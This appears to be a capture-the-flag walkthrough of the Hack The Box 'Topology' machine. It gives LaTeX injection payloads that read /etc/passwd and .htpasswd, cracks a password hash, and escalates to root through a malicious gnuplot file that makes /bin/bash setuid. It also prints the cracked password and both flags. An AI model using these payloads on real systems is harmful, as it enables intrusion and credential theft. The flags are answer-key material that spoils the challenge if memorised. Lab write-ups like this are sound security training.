@@ -1,0 +1,120 @@
+=================================================================================================
+													******** HTB - machines: Topology ********
+==================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.217
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.217
+PORT   STATE SERVICE
+
+22/tcp open  ssh
+80/tcp open  http
+
+** nmap -n -Pn -p80,22 -sC -sV $IP
+
+The above command was returning filtered ports so i had to use the below command:
+
+** sudo nmap -n -sT -Pn -p80,22 $IP -A
+
+Nmap scan report for 10.10.11.217
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
+|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
+|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT       ADDRESS
+1   149.39 ms 10.10.14.1
+2   131.41 ms 10.10.11.217
+
+
+===============================================================================================
+-- Host Enumeration:
+====================
+OS: Linux Ubuntu
+Web server: Apache 2.4.41
+Web App Technology:
+
+user creds:
+username: vdaisley
+home dir: /home/vdaisley
+user fullname: Vajramani Daisley
+.htpasswd: vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 ==> calculus20
+
+user.txt: 3f54aa2cd980a1010de423a4e8ddc6c0
+root.txt: a43cd41028f7fa6d2c0a0c15979e6769
+================================================================================================
+-- Host Walkthrough:
+====================
+I had to do add the '-A' tag in the nmap command as the normal '-sC -sV' tags were returning filtered 
+ports.
+
+Since i had no valid ssh private keys or valid user creds, i had to focus onn the web app.
+
+Using wfuzz for file and directory discovery returned nothing interesting.
+
+On manual inspection, I could see that there was a generator.php file that uses a latex formular 
+generator.
+
+On googling for Latex exploitation, i came accross some commands to use. The below latex command 
+listed the passwd file.
+
+** $\lstinputlisting{//etc/passwd}$
+
+In the /etc/passwd file, I could see the user vdaisley and her home directory.
+
+But could not do anything meaningful with this so I went back to the web app. I notoced that an env
+'developemt' was mentioned right underneath the latex generator.
+
+I decided to use our current LFI vuln to see if i could get anything from it. The domain I later used
+is the dev.topology.htb.
+
+From here i tried to view the .htaccess and .htpasswd files. The .htpasswd file showed me the md5
+hash for the user vdaisley which I cracked with hashcat as seen below.
+
+** $\lstinputlisting{/var/www/dev/.htaccess}$
+** $\lstinputlisting{/var/www/dev/.htpasswd}$
+** hashcat ./mai.txt /usr/share/wordlists/rockyou.txt
+
+Next I will try to ssh tom the host using these valid user creds.
+
+After a successful shs login I got the user.txt flag. To escalate to root priv, I did my normal enum
+but nothing good came out of it.
+
+Then I decided to use the pspy enum script to see what commands are being ran in the background.
+
+** https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+
+From the github link above, i download the righ tppy script after executing the 'uname -a' command
+
+On runnign the pspy64 script, I saw the below command being run in the backgroud
+
+** find /opt/gnuplot -name *.plt -exec gnuplot {} ;
+
+To exploit this, I used the below command to create a malicious .plt file for the gnuplot tool in the
+gnuplot folder. This will add a sticky bit to the bash command and once i run bash wit -p i am root.
+
+** 'system "chmod u+s /bin/bash"' > /opt/gnuplot/abc.plt
+** bash -p
+
+Pspy is a cli tool that enables snooping on processes without the need for root permissions. It allow
+us to see the commands run by other users, cron jobs, etc as the execute.
+
+Its great for enumerating linux systems.
+
+
